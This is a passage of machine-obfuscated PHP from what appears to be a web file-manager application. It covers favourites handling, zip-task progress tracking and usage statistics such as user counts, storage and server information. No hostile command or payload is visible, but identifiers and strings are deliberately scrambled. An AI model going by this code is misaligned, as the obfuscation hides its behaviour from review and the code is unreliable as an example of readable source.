} protected function listView() { $Ö®Äô¡» =& $_SERVER[¤·²È‰º]; $«ƒ»şùâ = $this->listData(); $Û¼ŠÆ˜ = array_filter_by_field($«ƒ»şùâ, $Ö®Äô¡»[43], $Ö®Äô¡»[424]); $øÓ€É‹Ç = array_to_keyvalue($Û¼ŠÆ˜, $Ö®Äô¡»[12], $Ö®Äô¡»[94]); if (!$øÓ€É‹Ç) { return $«ƒ»şùâ; } $¼“ªùüœ = 2000; $ôÆ™§Ò = array($Ö®Äô¡»[425] => array($Ö®Äô¡»[426], $øÓ€É‹Ç)); $«¥ ó“Õ = Model($Ö®Äô¡»[826])->listSource($ôÆ™§Ò, $¼“ªùüœ); $«¥ ó“Õ = array_merge($«¥ ó“Õ[$Ö®Äô¡»[93]], $«¥ ó“Õ[$Ö®Äô¡»[92]]); $«¥ ó“Õ = array_to_keyvalue($«¥ ó“Õ, $Ö®Äô¡»[410]); foreach ($«ƒ»şùâ as $­ûĞ‰÷  => $©¬°®îû) { $ ãòóÇŒ = $«¥ ó“Õ[$©¬°®îû[$Ö®Äô¡»[94]]]; $ ãòóÇŒ = $ ãòóÇŒ ? $ ãòóÇŒ : array(); $«ƒ»şùâ[$­ûĞ‰÷ ] = array_merge($ ãòóÇŒ, $©¬°®îû); } return $«ƒ»şùâ; } protected function addFav($İà…ğ‹¹, $ñü´È–† = '', $ó×–¿š½ = "\163\x6f\x75\162\143\145") { $µêíˆöæ =& $_SERVER[¤·²È‰º]; $²ˆİõ—Ş = array($µêíˆöæ[1642] => USER_ID, $µêíˆöæ[492] => 0, $µêíˆöæ[430] => $ó×–¿š½, $µêíˆöæ[429] => $İà…ğ‹¹); if ($this->where($²ˆİõ—Ş)->find()) { return !1; } $²ˆİõ—Ş = array($µêíˆöæ[1642] => USER_ID, $µêíˆöæ[492] => 0); $†¥‘ÖÍ‰ = $this->where($²ˆİõ—Ş)->max($µêíˆöæ[1847]); if (!$†¥‘ÖÍ‰) { $†¥‘ÖÍ‰ = 0; } if (!$ñü´È–† && $ó×–¿š½ == $µêíˆöæ[424]) { $°±¹İ¦¨ = Model($µêíˆöæ[1321])->where(array($µêíˆöæ[425] => $İà…ğ‹¹))->find(); if (!$°±¹İ¦¨) { return !1; } $ñü´È–† = $°±¹İ¦¨[$µêíˆöæ[42]]; } $ñü´È–† = $this->getAutoName($ñü´È–†); $œÖ“šı = array($µêíˆöæ[1642] => USER_ID, $µêíˆöæ[492] => 0, $µêíˆöæ[428] => $ñü´È–†, $µêíˆöæ[429] => $İà…ğ‹¹, $µêíˆöæ[430] => $ó×–¿š½, $µêíˆöæ[1827] => $†¥‘ÖÍ‰ + 1); return $this->add($œÖ“šı); } protected function remove($õï¿™Ñ) { $òÊõÉ¥ú =& $_SERVER[¤·²È‰º]; $Œå¯ÓĞ = array($òÊõÉ¥ú[1642] => USER_ID, $òÊõÉ¥ú[427] => $õï¿™Ñ); return $this->where($Œå¯ÓĞ)->delete(); } protected function removeByName($ƒÓÇºÚ«) { $¯–×…„Ï =& $_SERVER[¤·²È‰º]; $ı¸¾©Şë = array($¯–×…„Ï[1642] => USER_ID, $¯–×…„Ï[428] => $ƒÓÇºÚ«, $¯–×…„Ï[492] => 0); return $this->where($ı¸¾©Şë)->delete(); } protected function rename($ôş”÷ï, $˜ñ¥×óÃ) { $­ù‰‹í  =& $_SERVER[¤·²È‰º]; if ($ôş”÷ï == $˜ñ¥×óÃ) { return !1; } $®’ÙíÅ« = $this->getAutoName($˜ñ¥×óÃ); if ($˜ñ¥×óÃ != $®’ÙíÅ«) { return !1; } $Ğá¨¦ = array($­ù‰‹í [1642] => USER_ID, $­ù‰‹í [492] => 0, $­ù‰‹í [42] => $ôş”÷ï); return $this->where($Ğá¨¦)->save(array($­ù‰‹í [42] => $˜ñ¥×óÃ)); } protected function resetSort($á¨ÊÇ¼) { $§Å÷Ç‡É =& $_SERVER[¤·²È‰º]; $á¨ÊÇ¼ = is_array($á¨ÊÇ¼) ? $á¨ÊÇ¼ : array(); $¨ˆ¸“öŸ = array($§Å÷Ç‡É[1642] => USER_ID); for ($‰´–Ã« = 0; $‰´–Ã« < count($á¨ÊÇ¼); $‰´–Ã«++) { $¨ˆ¸“öŸ[$§Å÷Ç‡É[427]] = $á¨ÊÇ¼[$‰´–Ã«]; $this->where($¨ˆ¸“öŸ)->save(array($§Å÷Ç‡É[1827] => $‰´–Ã« + 1)); } return !0; } protected function moveTop($æèÜˆÂ–) { $±Äî¿óò =& $_SERVER[¤·²È‰º]; $‡¦óÅ¸ø = array($±Äî¿óò[1642] => USER_ID, $±Äî¿óò[492] => 0); $»ÍóÃ¼š = $this->where($‡¦óÅ¸ø)->where(array($±Äî¿óò[42] => $æèÜˆÂ–))->find(); if (!$»ÍóÃ¼š) { return; } $äÌµÕÚ = $this->field($±Äî¿óò[407])->where($‡¦óÅ¸ø)->order($±Äî¿óò[2268])->select(); $äÌµÕÚ = array_to_keyvalue($äÌµÕÚ, $±Äî¿óò[12], $±Äî¿óò[407]); $û¯Ğ®á¾ = $äÌµÕÚ; $äÌµÕÚ = array_remove_value($äÌµÕÚ, $»ÍóÃ¼š[$±Äî¿óò[407]]); array_unshift($äÌµÕÚ, $»ÍóÃ¼š[$±Äî¿óò[407]]); return $this->resetSort($äÌµÕÚ); } protected function moveBottom($ƒÍÎÈñ¿) { $³±Ğˆ =& $_SERVER[¤·²È‰º]; $Æç¸È»€ = array($³±Ğˆ[1642] => USER_ID, $³±Ğˆ[492] => 0); $ñ²àÂ¿¡ = $this->where($Æç¸È»€)->max($³±Ğˆ[1847]); $é‡ã¹ = array($³±Ğˆ[1847] => $ñ²àÂ¿¡ + 1); return $this->where($Æç¸È»€)->where(array($³±Ğˆ[42] => $ƒÍÎÈñ¿))->save($é‡ã¹); } private function getAutoName($Íæ¹ôÒÚ) { $÷³òè¾ =& $_SERVER[¤·²È‰º]; $’Ğ Èø = array($÷³òè¾[1642] => USER_ID, $÷³òè¾[492] => 0); $¬õß†Êõ = $this->field($÷³òè¾[42])->where($’Ğ Èø)->select(); $¬õß†Êõ = array_to_keyvalue($¬õß†Êõ, $÷³òè¾[12], $÷³òè¾[42]); if (!$¬õß†Êõ || !in_array($Íæ¹ôÒÚ, $¬õß†Êõ)) { return $Íæ¹ôÒÚ; } for ($…áĞ¾èÛ = 0; $…áĞ¾èÛ < count($¬õß†Êõ); $…áĞ¾èÛ++) { if (!in_array($Íæ¹ôÒÚ . "\50{$…áĞ¾èÛ}\x29", $¬õß†Êõ)) { return $Íæ¹ôÒÚ . "\x28{$…áĞ¾èÛ}\x29"; } } return $Íæ¹ôÒÚ . "\x28{$…áĞ¾èÛ}\51"; } } goto b½®ª­ÈŒÙ; eöëê“óğ“: class TaskZip extends TaskFileTransfer { protected function startAfter() { $¼‚¯ç¢ =& $_SERVER[¤·²È‰º]; parent::startAfter(); Hook::bind($¼‚¯ç¢[1750], array($this, $¼‚¯ç¢[1745])); $±˜Œğ¨œ =& $this->task; $±˜Œğ¨œ[$¼‚¯ç¢[1747]] = $¼‚¯ç¢[1193]; if (!$±˜Œğ¨œ[$¼‚¯ç¢[1550]]) { $±˜Œğ¨œ[$¼‚¯ç¢[1550]] = LNG($¼‚¯ç¢[1751]); } } protected function endAfter() { $˜‚œ£¢À =& $_SERVER[¤·²È‰º]; parent::endAfter(); Hook::unbind($˜‚œ£¢À[1750], array($this, $˜‚œ£¢À[1745])); } public function updateAfter() { $£‹Ù€†Ö =& $_SERVER[¤·²È‰º]; $ÜË¯òµ =& $this->task; if (!$ÜË¯òµ[$£‹Ù€†Ö[787]] || !$ÜË¯òµ[$£‹Ù€†Ö[764]]) { return; } if ($ÜË¯òµ[$£‹Ù€†Ö[1747]] == $£‹Ù€†Ö[1193]) { $îŸ›¦£… = $ÜË¯òµ[$£‹Ù€†Ö[1703]]; if ($ÜË¯òµ[$£‹Ù€†Ö[1704]] != $£‹Ù€†Ö[1193]) { $îŸ›¦£… = 0; } $«Ô¢Éò§ = ($ÜË¯òµ[$£‹Ù€†Ö[1707]] + $îŸ›¦£…) / $ÜË¯òµ[$£‹Ù€†Ö[764]]; $ÜË¯òµ[$£‹Ù€†Ö[1653]] = $«Ô¢Éò§ * 0.3; } else { if ($ÜË¯òµ[$£‹Ù€†Ö[1747]] == $£‹Ù€†Ö[322]) { $«Ô¢Éò§ = $ÜË¯òµ[$£‹Ù€†Ö[1652]] / $ÜË¯òµ[$£‹Ù€†Ö[787]]; $ÜË¯òµ[$£‹Ù€†Ö[1653]] = 0.3 + $«Ô¢Éò§ * 0.5; } else { if ($ÜË¯òµ[$£‹Ù€†Ö[1747]] == $£‹Ù€†Ö[117]) { $«Ô¢Éò§ = 0; if ($ÜË¯òµ[$£‹Ù€†Ö[1702]]) { $«Ô¢Éò§ = $ÜË¯òµ[$£‹Ù€†Ö[1703]] / $ÜË¯òµ[$£‹Ù€†Ö[1702]]; } $ÜË¯òµ[$£‹Ù€†Ö[1653]] = 0.3 + 0.5 + $«Ô¢Éò§ * 0.2; } } } if ($ÜË¯òµ[$£‹Ù€†Ö[1653]] > 0) { $şùƒªÊ¤ = timeFloat() - $ÜË¯òµ[$£‹Ù€†Ö[1655]] - $ÜË¯òµ[$£‹Ù€†Ö[1658]]; $ÜË¯òµ[$£‹Ù€†Ö[1659]] = $şùƒªÊ¤ * (1 - $ÜË¯òµ[$£‹Ù€†Ö[1653]]) / $ÜË¯òµ[$£‹Ù€†Ö[1653]]; } } public function copyFileStart($ôş•½­ô, $¨Àâ§÷, $Ñ·´¬ŠÔ, $˜¢ıüÏ†, $±™ŞŞÈ, $»”š³¸) { $Î‰Ë¤Õ• =& $_SERVER[¤·²È‰º]; parent::copyFileStart($ôş•½­ô, $¨Àâ§÷, $Ñ·´¬ŠÔ, $˜¢ıüÏ†, $±™ŞŞÈ, $»”š³¸); $ß×À®É¡ =& $this->task; if ($ß×À®É¡[$Î‰Ë¤Õ•[1747]] == $Î‰Ë¤Õ•[322]) { $ß×À®É¡[$Î‰Ë¤Õ•[1747]] = $Î‰Ë¤Õ•[117]; } $this->update(); } public function copyFileEnd($Úù°Óúµ, $½’‡Ë›¾, $ÈÂäÃ˜¥, $ÍƒÍ¹Øı, $×±¢ĞÉ¢, $›ÑÄÛş) { $­¨˜Ó =& $_SERVER[¤·²È‰º]; $¢ê‡óö =& $this->task; $¢ê‡óö[$­¨˜Ó[1703]] = $¢ê‡óö[$­¨˜Ó[1702]]; $¢ê‡óö[$­¨˜Ó[1707]] += $¢ê‡óö[$­¨˜Ó[1702]]; $¢ê‡óö[$­¨˜Ó[1704]] = $­¨˜Ó[12]; $this->update(); } public function nameParse($€ØÉîòù) { $ˆ‹ÑèˆÃ =& $_SERVER[¤·²È‰º]; $ÙŠÑÁÎÎ =& $this->task; if ($ÙŠÑÁÎÎ[$ˆ‹ÑèˆÃ[1652]] < $ÙŠÑÁÎÎ[$ˆ‹ÑèˆÃ[787]]) { $¼éÓŒŒš = get_path_this($€ØÉîòù); if (strstr($¼éÓŒŒš, $ˆ‹ÑèˆÃ[10])) { $ÙŠÑÁÎÎ[$ˆ‹ÑèˆÃ[1652]] += 1; } } if ($ÙŠÑÁÎÎ[$ˆ‹ÑèˆÃ[1747]] == $ˆ‹ÑèˆÃ[1193]) { $ÙŠÑÁÎÎ[$ˆ‹ÑèˆÃ[1747]] = $ˆ‹ÑèˆÃ[322]; } $ÙŠÑÁÎÎ[$ˆ‹ÑèˆÃ[1700]] = $€ØÉîòù; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ˆ™œè•ò) { $òÄÜ¬åÜ =& $_SERVER[¤·²È‰º]; $®ä±õÇ = array($òÄÜ¬åÜ[608] => array($òÄÜ¬åÜ[43] => $òÄÜ¬åÜ[1752], $òÄÜ¬åÜ[282] => array($òÄÜ¬åÜ[234], $òÄÜ¬åÜ[766], $òÄÜ¬åÜ[1753], $òÄÜ¬åÜ[1754])), $òÄÜ¬åÜ[1755] => array($òÄÜ¬åÜ[43] => $òÄÜ¬åÜ[1756], $òÄÜ¬åÜ[282] => array($òÄÜ¬åÜ[234], $òÄÜ¬åÜ[764], $òÄÜ¬åÜ[1757], $òÄÜ¬åÜ[1758], $òÄÜ¬åÜ[1759]))); if (!isset($®ä±õÇ[$ˆ™œè•ò])) { return !1; } $this->optionType = $®ä±õÇ[$ˆ™œè•ò][$òÄÜ¬åÜ[43]]; $this->field = $®ä±õÇ[$ˆ™œè•ò][$òÄÜ¬åÜ[282]]; return !0; } public function listData($ÖÇä­ = false, $œ¦»±û = "\155\x6f\x64\x69\x66\171\124\151\155\145", $ù¬ºŞ„Õ = false) { return parent::listData($ÖÇä­, $œ¦»±û, $ù¬ºŞ„Õ); } public function trendList($Ì½·ÄñØ) { $¯ €—Ç” =& $_SERVER[¤·²È‰º]; $”ãÇñÖü = $this->listData(); if ($”ãÇñÖü) { $‹ÆÒç€ = end($”ãÇñÖü); $¡Ë±¡ = date($¯ €—Ç”[1760], strtotime($¯ €—Ç”[1761])); if ($‹ÆÒç€[$¯ €—Ç”[234]] == $¡Ë±¡) { return $”ãÇñÖü; } $ÄÉ‚ºÍæ = strtotime($‹ÆÒç€[$¯ €—Ç”[234]]); } if (!isset($ÄÉ‚ºÍæ)) { $ÏìÖøÉÔ = $Ì½·ÄñØ == $¯ €—Ç”[608] ? $¯ €—Ç”[543] : $¯ €—Ç”[826]; $ÄÉ‚ºÍæ = Model($ÏìÖøÉÔ)->min($¯ €—Ç”[210]); } $ÕÜ•Î˜ = $¯ €—Ç”[1762] . ucfirst($Ì½·ÄñØ); $»±½Ï¢ª = $this->dateList($ÄÉ‚ºÍæ); foreach ($»±½Ï¢ª as $¡Ë±¡) { $this->{$ÕÜ•Î˜}($¡Ë±¡); } return $this->listData(); } private function dateList($ÍÍŒ’œÙ) { $Ò§ìªŠ© =& $_SERVER[¤·²È‰º]; $Ñçˆİİ = $ÍÍŒ’œÙ; $Îä¦·äé = strtotime($Ò§ìªŠ©[1761]); $áéçÁ¬è = array(); while ($Ñçˆİİ <= $Îä¦·äé) { $áéçÁ¬è[] = date($Ò§ìªŠ©[1760], $Ñçˆİİ); $Ñçˆİİ = strtotime($Ò§ìªŠ©[1763], $Ñçˆİİ); } return $áéçÁ¬è; } public function _recordUser($Ã¾Ç¯Î© = '') { $ÄÕ¬¿±Ú =& $_SERVER[¤·²È‰º]; $­‹½«¢ª = strtotime(date($ÄÕ¬¿±Ú[1764], strtotime($Ã¾Ç¯Î©))); $¨¯ªŒÖ  = strtotime(date($ÄÕ¬¿±Ú[1765], strtotime($Ã¾Ç¯Î©))); $èœ¼ˆåß = array($ÄÕ¬¿±Ú[210] => array($ÄÕ¬¿±Ú[1007], $¨¯ªŒÖ )); $”²ƒæÌ‘ = Model($ÄÕ¬¿±Ú[543])->where($èœ¼ˆåß)->count($ÄÕ¬¿±Ú[1651]); $èœ¼ˆåß[$ÄÕ¬¿±Ú[210]] = array($ÄÕ¬¿±Ú[342], array($­‹½«¢ª, $¨¯ªŒÖ )); $¦î²±ëÊ = Model($ÄÕ¬¿±Ú[543])->where($èœ¼ˆåß)->count($ÄÕ¬¿±Ú[1651]); $èœ¼ˆåß[$ÄÕ¬¿±Ú[43]] = $ÄÕ¬¿±Ú[1766]; $ê¾¼ñ¼’ = Model($ÄÕ¬¿±Ú[1767])->where($èœ¼ˆåß)->count($ÄÕ¬¿±Ú[1768]); $©¥éÆó = array($ÄÕ¬¿±Ú[234] => $Ã¾Ç¯Î©, $ÄÕ¬¿±Ú[766] => (int) $”²ƒæÌ‘, $ÄÕ¬¿±Ú[1753] => (int) $¦î²±ëÊ, $ÄÕ¬¿±Ú[1754] => (int) $ê¾¼ñ¼’); return $this->insert($©¥éÆó); } public function _recordStore($ãÙí½š¥ = '') { $À©´ú»£ =& $_SERVER[¤·²È‰º]; $ş£¡ŞÓ— = strtotime(date($À©´ú»£[1765], strtotime($ãÙí½š¥))); $Ú¹…ÌË = array($À©´ú»£[210] => array($À©´ú»£[1007], $ş£¡ŞÓ—)); $­à¬ãµİ = Model($À©´ú»£[479])->where($Ú¹…ÌË)->sum($À©´ú»£[86]); $Ú¹…ÌË[$À©´ú»£[418]] = 0; $ÊñúÓö = Model($À©´ú»£[826])->where($Ú¹…ÌË)->sum($À©´ú»£[86]); $Ú¹…ÌË[$À©´ú»£[419]] = 1; $³­€İ¬Š = Model($À©´ú»£[826])->where($Ú¹…ÌË)->sum($À©´ú»£[86]); $Ú¹…ÌË[$À©´ú»£[419]] = 2; $‘°ÎÏ³¡ = Model($À©´ú»£[826])->where($Ú¹…ÌË)->sum($À©´ú»£[86]); $Ê‹§Õ¤ = array($À©´ú»£[234] => $ãÙí½š¥, $À©´ú»£[764] => (int) $ÊñúÓö, $À©´ú»£[1757] => (int) $­à¬ãµİ, $À©´ú»£[1758] => (int) $³­€İ¬Š, $À©´ú»£[1759] => (int) $‘°ÎÏ³¡); return $this->insert($Ê‹§Õ¤); } public function trend($‹Ø£¿, $ıĞÂˆîÚ) { $æ‘â²¼· =& $_SERVER[¤·²È‰º]; if (!$this->init($‹Ø£¿)) { return !1; } $÷ÜÔ°İû = $this->trendList($‹Ø£¿); if ($÷ÜÔ°İû && $ıĞÂˆîÚ != $æ‘â²¼·[1624]) { $Œ¥ÜÄâó = $÷ÜÔ°İû[0][$æ‘â²¼·[234]]; $‹í²©Ô» = $this->validDate($ıĞÂˆîÚ, $Œ¥ÜÄâó); $À‰óä• = array(); $Ûï£Ôº» = array_to_keyvalue($÷ÜÔ°İû, $æ‘â²¼·[234]); foreach ($‹í²©Ô» as $Í€“¶ç) { if (isset($Ûï£Ôº»[$Í€“¶ç])) { $ùÇ¡Å“ = $Ûï£Ôº»[$Í€“¶ç]; } else { $ùÇ¡Å“ = end($÷ÜÔ°İû); $ùÇ¡Å“[$æ‘â²¼·[234]] = $Í€“¶ç; if ($‹Ø£¿ == $æ‘â²¼·[608]) { $ùÇ¡Å“[$æ‘â²¼·[1753]] = $ùÇ¡Å“[$æ‘â²¼·[1754]] = 0; } } $À‰óä•[] = $ùÇ¡Å“; } $÷ÜÔ°İû = $À‰óä•; } $£÷´«Óä = array($æ‘â²¼·[608] => array($æ‘â²¼·[766] => LNG($æ‘â²¼·[1769]), $æ‘â²¼·[1753] => LNG($æ‘â²¼·[1770]), $æ‘â²¼·[1754] => LNG($æ‘â²¼·[1771])), $æ‘â²¼·[1755] => array($æ‘â²¼·[764] => LNG($æ‘â²¼·[1772]), $æ‘â²¼·[1757] => LNG($æ‘â²¼·[1773]), $æ‘â²¼·[1758] => LNG($æ‘â²¼·[1774]), $æ‘â²¼·[1759] => LNG($æ‘â²¼·[1775]))); $ÉÖÆö½Œ = array($æ‘â²¼·[608] => $æ‘â²¼·[1776], $æ‘â²¼·[1755] => $æ‘â²¼·[86]); if (empty($÷ÜÔ°İû)) { $Í€“¶ç = date($æ‘â²¼·[1760], strtotime($æ‘â²¼·[1761])); $¡¸ÌàÑ = array($æ‘â²¼·[234] => $Í€“¶ç); foreach ($£÷´«Óä[$‹Ø£¿] as $…ÇÃâÁÓ => $—¡öí İ) { $¡¸ÌàÑ[$…ÇÃâÁÓ] = 0; } $÷ÜÔ°İû[] = $¡¸ÌàÑ; } $‹¬˜ŠÉ¼ = array(); foreach ($÷ÜÔ°İû as $—¡öí İ) { if ($‹Ø£¿ == $æ‘â²¼·[1755] && $—¡öí İ[$æ‘â²¼·[1757]] > $—¡öí İ[$æ‘â²¼·[764]]) { $—¡öí İ[$æ‘â²¼·[1757]] = $—¡öí İ[$æ‘â²¼·[764]]; } foreach ($£÷´«Óä[$‹Ø£¿] as $…ÇÃâÁÓ => $˜ñª©èŠ) { $ùÇ¡Å“ = array($æ‘â²¼·[234] => $—¡öí İ[$æ‘â²¼·[234]], $æ‘â²¼·[1550] => $˜ñª©èŠ); $ùÇ¡Å“[$ÉÖÆö½Œ[$‹Ø£¿]] = isset($—¡öí İ[$…ÇÃâÁÓ]) ? $—¡öí İ[$…ÇÃâÁÓ] : 0; $‹¬˜ŠÉ¼[] = $ùÇ¡Å“; } } return $‹¬˜ŠÉ¼; } public function validDate($ş¡«Ê£õ, $»ï†¨©™) { $º‡©ğîê =& $_SERVER[¤·²È‰º]; $âÕ°… = date($º‡©ğîê[1760], strtotime($º‡©ğîê[1761])); $ÖÈ÷åò = array($âÕ°…); switch ($ş¡«Ê£õ) { case $º‡©ğîê[1631]: $õõÕÇş = mktime(0, 0, 0, date($º‡©ğîê[1777]), date($º‡©ğîê[1369]) - date($º‡©ğîê[1432]) + 7 - 7, date($º‡©ğîê[1778])); $òæîúñó = 0; do { $ã•î¯í‘ = date($º‡©ğîê[1760], $õõÕÇş - 3600 * 24 * 7 * $òæîúñó); $ÖÈ÷åò[] = $ã•î¯í‘; $òæîúñó++; } while ($»ï†¨©™ < $ã•î¯í‘); break; case $º‡©ğîê[1629]: $òæîúñó = 1; do { $ØÔäüîª = date($º‡©ğîê[1779], strtotime("\x2d\40{$òæîúñó}\x20\x6d\157\x6e\164\150\x73")); $ÖÈ÷åò[] = $ØÔäüîª; $òæîúñó++; } while ($»ï†¨©™ < $ØÔäüîª); break; case $º‡©ğîê[1780]: $°áó„Ëë = (int) date($º‡©ğîê[1778], strtotime($»ï†¨©™)); $Ô“ë™İŸ = (int) date($º‡©ğîê[1778]); if ($°áó„Ëë >= $Ô“ë™İŸ) { break; } for ($°áó„Ëë; $°áó„Ëë < $Ô“ë™İŸ; $°áó„Ëë++) { $ÖÈ÷åò[] = $°áó„Ëë . $º‡©ğîê[1781]; } break; default: break; } if ($»ï†¨©™ > end($ÖÈ÷åò)) { array_pop($ÖÈ÷åò); } sort($ÖÈ÷åò); return $ÖÈ÷åò; } public function listTable($İ‚á˜íº) { $™ëı²“ = ucfirst($İ‚á˜íº); return Model($™ëı²“)->listData(); } public function option($ØÜø€Ğ³) { $¢³»¹ªÀ = $_SERVER[¤·²È‰º][1782] . ucfirst($ØÜø€Ğ³); return $this->{$¢³»¹ªÀ}(); } private function optionUser() { $ƒ÷êø‘ =& $_SERVER[¤·²È‰º]; $Ï›½ßî = Model($ƒ÷êø‘[543])->count($ƒ÷êø‘[1651]); $¤Ïš‰Ìç = Model($ƒ÷êø‘[543])->where($ƒ÷êø‘[1783])->count($ƒ÷êø‘[1651]); $‚§ïÂ‡­ = intval($GLOBALS[$ƒ÷êø‘[6]][$ƒ÷êø‘[358]][$ƒ÷êø‘[1606]]) / 3600; $µË£Š«Ü = strtotime("\55{$‚§ïÂ‡­}\40\150\x6f\165\x72\163"); $ÌåÖÀ = strtotime(date($ƒ÷êø‘[1764])); if ($µË£Š«Ü < $ÌåÖÀ) { $µË£Š«Ü = $ÌåÖÀ; } $ÈìÛòÙ = array($ƒ÷êø‘[1784] => array($ƒ÷êø‘[1008], $µË£Š«Ü)); $Â†¡åßğ = (int) Model($ƒ÷êø‘[543])->where($ÈìÛòÙ)->count($ƒ÷êø‘[1651]); if (!$Â†¡åßğ) { $Â†¡åßğ = 1; } $ÈìÛòÙ = array($ƒ÷êø‘[1784] => array($ƒ÷êø‘[1008], $ÌåÖÀ)); $Ì¥ÁºÇó = Model($ƒ÷êø‘[543])->where($ÈìÛòÙ)->count($ƒ÷êø‘[1651]); return array($ƒ÷êø‘[760] => (int) $Ï›½ßî, $ƒ÷êø‘[1785] => (int) ($Ï›½ßî - $¤Ïš‰Ìç), $ƒ÷êø‘[1786] => (int) $¤Ïš‰Ìç, $ƒ÷êø‘[1787] => (int) $Ì¥ÁºÇó, $ƒ÷êø‘[1788] => $Â†¡åßğ); } private function optionFile() { $Ñ˜ø°Áà =& $_SERVER[¤·²È‰º]; $­­¡éÄ¸ = $this->sourceSize(); $á†¨”×å = $­­¡éÄ¸[$Ñ˜ø°Áà[86]]; $Äº²„¯ï = $­­¡éÄ¸[$Ñ˜ø°Áà[1757]]; $Ôı™‘ıò = Model($Ñ˜ø°Áà[826])->where(array($Ñ˜ø°Áà[418] => 0))->count($Ñ˜ø°Áà[410]); $±€Ä¥ïÖ = array($Ñ˜ø°Áà[418] => 0, $Ñ˜ø°Áà[210] => array($Ñ˜ø°Áà[1008], strtotime(date($Ñ˜ø°Áà[1764])))); $ç¾Ó˜¦Û = Model($Ñ˜ø°Áà[826])->where($±€Ä¥ïÖ)->sum($Ñ˜ø°Áà[86]); $¥ˆñÕŠ = Model($Ñ˜ø°Áà[826])->where($±€Ä¥ïÖ)->count($Ñ˜ø°Áà[410]); return array($Ñ˜ø°Áà[764] => $á†¨”×å, $Ñ˜ø°Áà[1757] => $Äº²„¯ï, $Ñ˜ø°Áà[1789] => $á†¨”×å - $Äº²„¯ï, $Ñ˜ø°Áà[1790] => (int) $ç¾Ó˜¦Û, $Ñ˜ø°Áà[766] => (int) $Ôı™‘ıò, $Ñ˜ø°Áà[1791] => (int) $¥ˆñÕŠ); } private function optionAccess() { $š÷”¹µÅ =& $_SERVER[¤·²È‰º]; return array($š÷”¹µÅ[760] => $this->typeLogCnt(), $š÷”¹µÅ[117] => $this->typeLogCnt($š÷”¹µÅ[117]), $š÷”¹µÅ[460] => $this->typeLogCnt($š÷”¹µÅ[460]), $š÷”¹µÅ[1792] => $this->typeLogCnt($š÷”¹µÅ[1792]), $š÷”¹µÅ[1793] => $this->typeLogCnt($š÷”¹µÅ[1793]), $š÷”¹µÅ[608] => $this->typeLogCnt($š÷”¹µÅ[12], $š÷”¹µÅ[1768])); } private function typeLogCnt($öå Ì‡Â = '', $æÀ¯§×© = "\151\144") { $®Æ¶ñÏ› =& $_SERVER[¤·²È‰º]; $”†ÄŞŒ’ = array($®Æ¶ñÏ›[117] => array($®Æ¶ñÏ›[1794], $®Æ¶ñÏ›[1795]), $®Æ¶ñÏ›[460] => array($®Æ¶ñÏ›[1796], $®Æ¶ñÏ›[1797]), $®Æ¶ñÏ›[1792] => array($®Æ¶ñÏ›[1798], $®Æ¶ñÏ›[1799], $®Æ¶ñÏ›[1800]), $®Æ¶ñÏ›[1793] => array($®Æ¶ñÏ›[1801], $®Æ¶ñÏ›[1802]), $®Æ¶ñÏ›[1803] => array($®Æ¶ñÏ›[1804], $®Æ¶ñÏ›[1805], $®Æ¶ñÏ›[1806])); $›ÀùŞ×¹ = strtotime(date($®Æ¶ñÏ›[1764])); $ëäÆ½©Œ = array($®Æ¶ñÏ›[210] => array($®Æ¶ñÏ›[1008], $›ÀùŞ×¹)); if ($öå Ì‡Â) { $ëäÆ½©Œ[$®Æ¶ñÏ›[43]] = array($®Æ¶ñÏ›[7], $”†ÄŞŒ’[$öå Ì‡Â]); } $Ã°—Õßë = Model($®Æ¶ñÏ›[1767])->where($ëäÆ½©Œ)->count($æÀ¯§×©); return (int) $Ã°—Õßë; } private function optionServer() { $ÚÉêÁúõ =& $_SERVER[¤·²È‰º]; $úóğÄÆ“ = $this->diskDriver(); $úî‘ş¡´ = KodIO::defaultDriver(); $ÔÈ›ØèÓ = array($ÚÉêÁúõ[818] => $úî‘ş¡´[$ÚÉêÁúõ[407]]); $õŠâóÏ¤ = Model($ÚÉêÁúõ[479])->where($ÔÈ›ØèÓ)->sum($ÚÉêÁúõ[86]); $ò…Éš½É = explode($ÚÉêÁúõ[63], $_SERVER[$ÚÉêÁúõ[153]]); $œêü×ªÑ = $ò…Éš½É[0]; $¬Æ³‘œ = $GLOBALS[$ÚÉêÁúõ[6]][$ÚÉêÁúõ[31]]; $ñşŠÑ€Ã = $¬Æ³‘œ[$ÚÉêÁúõ[970]]; if ($ñşŠÑ€Ã == $ÚÉêÁúõ[958]) { $Ì€«Í¶ = explode($ÚÉêÁúõ[1266], $¬Æ³‘œ[$ÚÉêÁúõ[969]]); $ñşŠÑ€Ã = $Ì€«Í¶[0]; } if ($ñşŠÑ€Ã == $ÚÉêÁúõ[906] || $ñşŠÑ€Ã == $ÚÉêÁúõ[805]) { $¦Šõ¤ğ· = Model()->db()->query($ÚÉêÁúõ[1807]); $öŞ˜ö”„ = $¦Šõ¤ğ·[0] && isset($¦Šõ¤ğ·[0][$ÚÉêÁúõ[1549]]) ? $¦Šõ¤ğ·[0][$ÚÉêÁúõ[1549]] : 0; $ñşŠÑ€Ã = $ÚÉêÁúõ[1808] . ($öŞ˜ö”„ ? $ÚÉêÁúõ[8] . $öŞ˜ö”„ : $ÚÉêÁúõ[12]); } $ú’Œ†èş = $GLOBALS[$ÚÉêÁúõ[6]][$ÚÉêÁúõ[358]][$ÚÉêÁúõ[828]]; return array($ÚÉêÁúõ[1809] => $úóğÄÆ“ ? $úóğÄÆ“[$ÚÉêÁúõ[1810]] : 0, $ÚÉêÁúõ[1811] => $úóğÄÆ“ ? $úóğÄÆ“[$ÚÉêÁúõ[1812]] : 0, $ÚÉêÁúõ[1813] => (int) $úî‘ş¡´[$ÚÉêÁúõ[1810]] * 1024 * 1024 * 1024, $ÚÉêÁúõ[1814] => (int) $õŠâóÏ¤, $ÚÉêÁúõ[1815] => ucfirst($œêü×ªÑ), $ÚÉêÁúõ[1816] => $ÚÉêÁúõ[1817] . PHP_VERSION, $ÚÉêÁúõ[1818] => phpBuild64() ? 64 : 32, $ÚÉêÁúõ[759] => str_replace($ÚÉêÁúõ[1124], $ÚÉêÁúõ[986], $ñşŠÑ€Ã), $ÚÉêÁúõ[358] => ucfirst($ú’Œ†èş), $ÚÉêÁúõ[42] => $_SERVER[$ÚÉêÁúõ[1819]]); } private function diskDriver() { $½²¨®ë´ =& $_SERVER[¤·²È‰º]; $ìŸ¶Ó¡ê = $½²¨®ë´[8]; $Ø¬ŞÆ¦é = $GLOBALS[$½²¨®ë´[6]][$½²¨®ë´[1282]] == $½²¨®ë´[1283]; if ($Ø¬ŞÆ¦é) { $ìŸ¶Ó¡ê = 